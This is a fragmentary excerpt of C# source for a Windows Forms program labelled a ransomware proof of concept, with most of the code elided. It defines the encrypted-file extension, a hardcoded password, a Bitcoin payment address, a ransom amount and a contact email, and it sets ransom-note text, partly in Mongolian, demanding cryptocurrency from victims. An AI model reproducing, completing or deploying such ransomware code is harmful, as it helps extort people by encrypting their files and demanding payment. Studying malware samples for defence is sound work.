...
namespace RansomwarePOC
{
    public partial class Form1 : Form
    {
        ...
        private const string ENCRYPTED_FILE_EXTENSION = ".burinzhargalcrypt";
        private const string ENCRYPT_PASSWORD = "Password1";
        private const string BITCOIN_ADDRESS = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
        private const string BITCOIN_RANSOM_AMOUNT = "3";
        private const string EMAIL_ADDRESS = "allyourbasesarebelongtous@main.com";
        ...
        private void formatFormPostEncryption()
        {
            ...
            lblCount.Text = "Танай файлнууд(amount: " + encryptedFileCount + ") шифрлэх тээ!";
        }
        ...
        private void initializeForm()
        {
            ...
            //this.WindowState = FormWindowState.Maximized;
            lblBitcoinAmount.Text = "Please send " +BITCOIN_RANSOM_AMOUNT + " Dogecoins(s) to the following BTC address:";
